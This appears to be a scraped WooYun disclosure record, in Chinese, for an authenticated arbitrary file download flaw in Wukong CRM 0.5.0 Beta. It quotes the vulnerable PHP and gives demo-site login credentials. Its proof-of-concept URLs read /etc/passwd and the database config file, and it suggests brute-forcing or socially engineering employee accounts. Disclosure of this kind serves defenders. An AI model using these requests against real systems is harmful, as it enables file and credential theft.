{"id": 38406, "wybug_id": "wooyun-2015-0105480", "wybug_title": "悟空CRM任意文件下载漏洞(需登录)", "wybug_corp": "悟空CRM", "wybug_author": "testing", "wybug_date": "2015-04-07 10:18", "wybug_open_date": "2015-05-22 10:20", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 悟空CRM任意文件下载漏洞 详细说明：  悟空CRM 0.5.0 Beta版\n\\app\\Lib\\Action\\FileAction.class.php 163行public function filedownload(){\t$path = trim(urldecode($_GET['path']));\t$name = substr(trim(urldecode($_GET['name'])),0,-4);\tif($path && $name)\tdownload($path,$name);\telse $this->error('非法操作！');}\n$_GET['path']和$_GET['name']未过滤后调用download函数，跟踪查看函数代码。\n\\app\\Common\\common.php1204行 function download($file,$name=''){    $fileName = $name ? $name : pathinfo($file,PATHINFO_FILENAME);    $filePath = realpath($file);        $fp = fopen($filePath,'rb');        if(!$filePath || !$fp){        header('HTTP/1.1 404 Not Found');        echo \"Error: 404 Not Found.(server file path error)<!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding --><!-- Padding -->\";        exit;    }        $fileName = $fileName .'.'. pathinfo($filePath,PATHINFO_EXTENSION);    $encoded_filename = urlencode($fileName);    $encoded_filename = str_replace(\"+\", \"%20\", $encoded_filename);        header('HTTP/1.1 200 OK');    header( \"Pragma: public\" );    header( \"Expires: 0\" );    header(\"Content-type: application/octet-stream\");    header(\"Content-Length: \".filesize($filePath));    header(\"Accept-Ranges: bytes\");    header(\"Accept-Length: \".filesize($filePath));        $ua = $_SERVER[\"HTTP_USER_AGENT\"];    if (preg_match(\"/MSIE/\", $ua)) {        header('Content-Disposition: attachment; filename=\"' . $encoded_filename . '\"');    } else if (preg_match(\"/Firefox/\", $ua)) {        header('Content-Disposition: attachment; filename*=\"utf8\\'\\'' . $fileName . '\"');    } else {        header('Content-Disposition: attachment; filename=\"' . $fileName . '\"');    }        // ob_end_clean(); <--有些情况可能需要调用此函数    // 输出文件内容    fpassthru($fp);    exit; }\n$filePath = realpath($file);做了路径过滤，不准出现../来绕过路径限制，但是紧接着执行$fp = fopen($filePath,'rb');就使得过滤毫无作用。因为可以传递一个绝对路径，直接造成任意文件遍历。可以看到参数传递过程是这样的，$_GET['path'] -> $file -> $filePath ->fopen($filePath,'rb')拿官网提供的示例页面证明：http://crm.demo.5kcrm.com账号：admin 密码:123456a 登陆。（CRM系统只有登陆界面在未登录状态可访问，所以本漏洞至少需要一个普通权限账号才可验证，由于员工账号安全性较低，可通过爆破或社工手段获得）登陆后打开：http://crm.demo.5kcrm.com/index.php?m=file&a=filedownload&path=/etc/passwd&name=test.test\n\nhttp://crm.demo.5kcrm.com/index.php?m=file&a=filedownload&path=./App/Conf/db.php&name=test.test\n\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 testing@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}